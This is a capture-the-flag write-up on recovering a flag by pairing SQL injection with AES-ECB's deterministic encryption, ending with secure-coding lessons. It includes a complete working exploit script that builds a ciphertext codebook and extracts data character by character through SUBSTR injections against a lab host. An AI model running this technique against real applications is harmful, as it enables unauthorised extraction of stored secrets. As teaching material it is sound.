# AES-ECB Chosen Plaintext Attack via SQL Injection - Writeup

## Challenge Overview
This challenge combines two critical vulnerabilities:
1. **SQL Injection**: The application directly interpolates user input into SQL queries
2. **ECB Mode Weakness**: Uses deterministic AES-ECB encryption that leaks plaintext patterns

## Key Vulnerabilities

### 1. SQL Injection
The vulnerable code:
```python
query = flask.request.args.get("query") or "'A'"
sql = f'SELECT {query} FROM secrets'  # Direct interpolation!
```

Allows us to:
- Execute arbitrary SQL expressions
- Control exactly what gets encrypted
- Extract data character-by-character

### 2. ECB Encryption Weakness
Identical plaintext blocks produce identical ciphertexts. The server:
1. Takes SQL query results
2. Pads them to 16-byte blocks
3. Encrypts with AES-ECB

## Attack Methodology

### Phase 1: Build the Codebook
```python
for c in charset:
    payload = f"'{c}'"  # SQL string literal
    response = requests.get(f"?query={quote(payload)}")
    ct = extract_ct(response.text)
    codebook[ct] = c
```
- Creates mappings like `'p' → ec3ca9a4...`
- Uses all printable characters likely in flags
- Takes ~63 requests (one per character)

### Phase 2: Extract the Flag
```python
for i in range(1, 60):
    payload = f"SUBSTR(flag,{i},1)"
    ct = query(payload)
    if ct in codebook:
        flag += codebook[ct]
```
- Extracts characters one at a time
- Matches ciphertexts against our codebook
- Stops when ciphertexts don't match (end of flag)

## Why This Works

### SQL Injection Enables Plaintext Control
By injecting `SUBSTR(flag,1,1)` we:
1. Make the server return the first flag character
2. Get it encrypted exactly like our codebook characters
3. Can directly compare ciphertexts

### ECB's Deterministic Encryption
- `encrypt(pad('p'))` always equals `encrypt(first_flag_char)`
- Same plaintext = same ciphertext in ECB
- No need to know the key!

## Complete Solution Code
```python
import requests
from urllib.parse import quote

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}-!?."

def build_codebook():
    codebook = {}
    for c in charset:
        payload = f"'{c}'"
        r = requests.get(f"http://challenge.localhost/?query={quote(payload)}")
        ct = r.text.split("<pre>")[2].split("</pre>")[0]
        codebook[ct] = c
    return codebook

def extract_flag(codebook):
    flag = ""
    for i in range(1, 60):
        payload = f"SUBSTR(flag,{i},1)"
        r = requests.get(f"http://challenge.localhost/?query={quote(payload)}")
        ct = r.text.split("<pre>")[2].split("</pre>")[0]
        if ct in codebook:
            flag += codebook[ct]
        else:
            break
    return flag

codebook = build_codebook()
flag = extract_flag(codebook)
print("Flag:", flag)
```

## Execution Flow
1. Build codebook:
   - `'a'` → `d1cfcb1e...`
   - `'b'` → `8cc5ff91...`
   - ...

2. Extract flag:
   - `SUBSTR(flag,1,1)` → matches `'p'` ciphertext
   - `SUBSTR(flag,2,1)` → matches `'w'` ciphertext
   - ... until complete flag is recovered

## Lessons Learned
1. **Never use ECB mode** for sensitive data - it leaks plaintext patterns
2. **Always parameterize SQL queries** - string interpolation is dangerous
3. **Chosen plaintext attacks** are powerful when attackers can control input
4. **Padding matters** - must be consistent between attack phases

This attack demonstrates how cryptographic weaknesses combine with web vulnerabilities to break systems. The solution efficiently exploits both to recover the complete flag.
